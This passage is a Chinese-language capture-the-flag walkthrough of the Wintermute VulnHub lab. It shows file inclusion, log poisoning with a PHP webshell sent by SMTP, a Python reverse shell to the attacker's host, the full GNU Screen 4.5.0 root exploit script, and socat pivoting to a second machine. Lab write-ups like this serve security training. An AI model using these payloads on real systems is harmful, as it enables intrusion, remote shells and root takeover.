class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">| http-vuln-cve2010-0738: </span></span><br><span class="line"><span class="string">|_  /jmx-console/: Authentication was not required</span></span><br></pre></td></tr></table></figure>

<p>访问80端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub156.jpg"></p>
<p>访问3000端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub157.jpg"></p>
<p>发现下方有提示说用户密码都是admin，然后直接登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hint: the default user and password are admin</span><br></pre></td></tr></table></figure>
<p>发现有一些目录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub158.jpg"></p>
<p>然后访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTExL3R1cmluZy1ib2xvLw==">http://192.168.56.111/turing-bolo/<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub159.jpg"></p>
<p>点击之后显示如下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub160.jpg"></p>
<p>从上面的屏幕截图中，可以看到一些日志文件（突出显示）。根据经验，目录遍历，可以在浏览器中执行可写文件。因此，尝试将../../../log/mail附加到浏览器中的URL，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=../../../<span class="built_in">log</span>/mail</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub161.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub162.jpg"></p>
<p>使用下面的url也可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有用。现在，让尝试使用telnet发送恶意邮件。在邮件主题中包括一些php代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.111 25</span></span><br><span class="line">Trying 192.168.56.111...</span><br><span class="line">Connected to 192.168.56.111.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">HELO hack.com</span><br><span class="line">250 straylight</span><br><span class="line">MAIL FROM: hacker@hack.com</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO: wintermute@localhost.com</span><br><span class="line">454 4.7.1 &lt;wintermute@localhost.com&gt;: Relay access denied</span><br><span class="line">RCPT TO: wintermute</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">subject: &lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;luci&#x27;</span>]); ?&gt;</span><br><span class="line">hacked!!</span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as EC8E454D7</span><br><span class="line">quit</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>现在再次包含mail.log文件，但是这次发送第二个GET参数luci，该参数将执行我们的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail&amp;luci=id</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub163.jpg"></p>
<p>可以看到成功执行命令，现在构造以下的poc以获得一个reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail&amp;luci=python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.56.102&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以看到kali端成功弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.109: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 48508</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (771): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看是否有可提权的SUID文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>

<p>在screen-4.5.0上运行searchsploit将返回漏洞，以提升权限，完美！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5</span></span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">                                                              | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                 | exploits/linux/<span class="built_in">local</span>/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)           | exploits/linux/<span class="built_in">local</span>/41152.txt</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>看一下exp的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/41154.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellr</span><br></pre></td></tr></table></figure>

<p>运行以下sed命令将脚本格式换行和缩进转化一下，脚本才能正常运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 41154.sh</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>转换为tty标准的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>如下成功运行脚本，成功提权，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">&lt;ring-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">--2020-01-15 01:30:12--  http://192.168.56.102:8000/41154.sh</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1151 (1.1K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[===================&gt;]   1.12K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 01:30:12 (415 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1151/1151]</span><br><span class="line"></span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ ls</span><br><span class="line">ls</span><br><span class="line">41154.sh      bolo.css  c7.png    css         molly.log    ta.png</span><br><span class="line">armitage.log  bolo.php  case.log  index.html  riviera.log</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">/tmp/libhax.c: In <span class="keyword">function</span> <span class="string">&#x27;dropshell&#x27;</span>:</span><br><span class="line">/tmp/libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;chmod&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">     ^~~~~</span><br><span class="line">/tmp/rootshell.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setuid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setgid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setgid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;seteuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     seteuid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setegid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setegid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;execvp&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">     ^~~~~~</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt  note.txt  scripts</span><br><span class="line"><span class="comment"># cat note.txt</span></span><br><span class="line">cat note.txt</span><br><span class="line">Devs,</span><br><span class="line"></span><br><span class="line">Lady 3Jane has asked us to create a custom java app on Neuromancer<span class="string">&#x27;s primary server to help her interact w/ the AI via a web-based GUI.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The engineering team couldn&#x27;</span>t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can <span class="keyword">do</span>.</span><br><span class="line"></span><br><span class="line">Anyways, we<span class="string">&#x27;ve deployed the war file on tomcat as ordered - located here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/struts2_2.3.15.1-showcase</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s ready <span class="keyword">for</span> the devs to customize to her liking...I<span class="string">&#x27;m stating the obvious, but make sure to secure this thing.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bob Laugh</span></span><br><span class="line"><span class="string">Turing Systems Engineer II</span></span><br><span class="line"><span class="string">Freeside//Straylight//Ops5</span></span><br><span class="line"><span class="string"># cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string">5ed185fd75a8d6a7056c96a436c6d8aa</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub164.jpg"></p>
<p>winterMute第一部分到此结束</p>
<ul>
<li>总结：</li>
</ul>
<p> 1.弱口令<br> 2.文件包含<br> 3.telnet发送恶意邮件写shell<br> 4.python reverse shell<br> 5.Screen 4.5.0本地提权<br> 6.用(sed -i -e ‘s/\r$//‘)将exp换行和缩进和格式变得可执行</p>
<h4 id="Wintermute-Neuromancer"><a href="#Wintermute-Neuromancer" class="headerlink" title="Wintermute-Neuromancer"></a>Wintermute-Neuromancer</h4><p>之前的note.txt向显示一个可能的网络目录。但是，当不知道Neuromancer上的哪些端口打开时，这是没有用的。查看Straylight的arp表将告诉我们Neuromancer的地址，即192.168.56.110。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arp -a</span></span><br><span class="line">arp -a</span><br><span class="line">? (192.168.56.102) at 00:0c:29:70:75:41 [ether] on enp0s8</span><br><span class="line">? (192.168.56.110) at 08:00:27:de:b9:3d [ether] on enp0s8</span><br><span class="line">? (192.168.56.1) at 0a:00:27:00:00:19 [ether] on enp0s8</span><br><span class="line">? (192.168.56.100) at 08:00:27:25:3d:8a [ether] on enp0s8</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ifconfig</span></span><br><span class="line">ifconfig</span><br><span class="line">enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.111  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fe50:96d9  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:50:96:d9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 771  bytes 65226 (63.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 21  bytes 2052 (2.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">enp0s8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.109  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fea9:7af0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:a9:7a:f0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 197671  bytes 11899335 (11.3 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 197077  bytes 14611455 (13.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>也可以写一个脚本探测存活的主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(seq 1 254); <span class="keyword">do</span></span><br><span class="line">   ping -c 1 192.168.56.<span class="variable">$ip</span> | grep <span class="string">&quot;bytes from&quot;</span> | cut -d <span class="string">&quot; &quot;</span> -f 4 | cut -d <span class="string">&quot;:&quot;</span> -f 1 &amp;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./pingsweep.sh</span></span><br><span class="line">./pingsweep.sh</span><br><span class="line">192.168.56.100</span><br><span class="line">192.168.56.102</span><br><span class="line">192.168.56.111</span><br><span class="line">192.168.56.110</span><br><span class="line">192.168.56.109</span><br></pre></td></tr></table></figure>

<p>其中192.168.56.102是kali的ip，192.168.56.109，和192.168.56.111都是Straylight的ip，192.168.56.100是vbox Host-only Adapter网卡的网关地址，剩下的192.168.56.110就是Neuromancer机器的ip地址。</p>
<p>使用nc扫描端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.110 $i 2&gt;&amp;1; done | grep -v &quot;Connection refused&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 65535); <span class="keyword">do</span> nc -nvz -w 1 192.168.56.110 <span class="variable">$i</span> 2&gt;&amp;1; <span class="keyword">done</span> | grep -v <span class="string">&quot;Connection refused&quot;</span></span><br><span class="line">(UNKNOWN) [192.168.56.110] 8009 (?) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 8080 (http-alt) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 34483 (?) open</span><br></pre></td></tr></table></figure>

<p>这里有三个开放的端口8009、8080和34483，但是问题是，如果尝试访问IP和端口，将看不到任何内容。为了能够加入它们，必须进行端口转发。对于端口转发，可以使用socat之类的socat，如socat TCP-LISTEN：5000,fork,reuseaddr tcp：127.0.0.1：8080，这意味着8080上的网站应该在外部的5000端口上可见。但是，由于需要处理三个端口，必须在每个命令的末尾加上＆。＆in nix告诉系统执行命令并将其置于后台。简而言之，将执行以下命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span></span><br><span class="line">socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span><br></pre></td></tr></table></figure>

<p>然后上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p 8009,8080,34483 -Pn -A --script=vuln 192.168.56.110</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp  open  http    Apache Tomcat 9.0.0.M26</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /examples/: Sample scripts</span><br><span class="line">|   /manager/html/upload: Apache Tomcat (401 )</span><br><span class="line">|   /manager/html: Apache Tomcat (401 )</span><br><span class="line">|_  /docs/: Potentially interesting folder</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>然后访问之前note.txt中提到的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub165.jpg"></p>
<p>Apache struts有一些已知的漏洞利用。当使用searchsploit搜索“apache struts”时，可以看到许多可能的利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit apache struts</span></span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                  |  Path                                  </span><br><span class="line">                                                                                                | (/usr/share/exploitdb/)                </span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Apache Struts - <span class="string">&#x27;ParametersInterceptor&#x27;</span> Remote Code Execution (Metasploit)                      | exploits/multiple/remote/24874.rb</span><br><span class="line">Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                     | exploits/multiple/remote/33142.rb</span><br><span class="line">Apache Struts - Developer Mode OGNL Execution (Metasploit)                                      | exploits/java/remote/31434.rb</span><br><span class="line">Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                    | exploits/linux/remote/39756.rb</span><br><span class="line">Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                        | exploits/multiple/webapps/18452.txt</span><br><span class="line">Apache Struts - OGNL Expression Injection                                                       | exploits/multiple/remote/38549.txt</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                | exploits/multiple/remote/43382.py</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)   | exploits/multiple/remote/39919.rb</span><br><span class="line">Apache Struts - includeParams Remote Code Execution (Metasploit)                                | exploits/multiple/remote/25980.rb</span><br><span class="line">Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                       | exploits/multiple/remote/26542.txt</span><br><span class="line">Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                 | exploits/multiple/remote/27135.rb</span><br><span class="line">Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                | exploits/multiple/remote/45367.rb</span><br><span class="line">Apache Struts 2 - Skill Name Remote Code Execution                                              | exploits/multiple/remote/37647.txt</span><br><span class="line">Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                     | exploits/multiple/remote/44643.rb</span><br><span class="line">Apache Struts 2 &lt; 2.3.1 - Multiple Vulnerabilities                                              | exploits/multiple/webapps/18329.txt</span><br><span class="line">Apache Struts 2.0 - <span class="string">&#x27;XSLTResult.java&#x27;</span> Arbitrary File Upload                                     | exploits/java/webapps/37009.xml</span><br><span class="line">Apache Struts 2.0.0 &lt; 2.2.1.1 - XWork <span class="string">&#x27;s:submit&#x27;</span> HTML Tag Cross-Site Scripting                  | exploits/multiple/remote/35735.txt</span><br><span class="line">Apache Struts 2.0.1 &lt; 2.3.33 / 2.5 &lt; 2.5.10 - Arbitrary Code Execution                          | exploits/multiple/remote/44556.py</span><br><span class="line">Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                   | exploits/multiple/remote/36426.txt</span><br><span class="line">Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/18984.rb</span><br><span class="line">Apache Struts 2.2.3 - Multiple Open Redirections                                                | exploits/multiple/remote/38666.txt</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (1)                           | exploits/linux/remote/45260.py</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (2)                           | exploits/multiple/remote/45262.py</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - <span class="string">&#x27;Jakarta&#x27;</span> Multipart Parser OGNL Injection (Metasp | exploits/multiple/remote/41614.rb</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - Remote Code Execution                             | 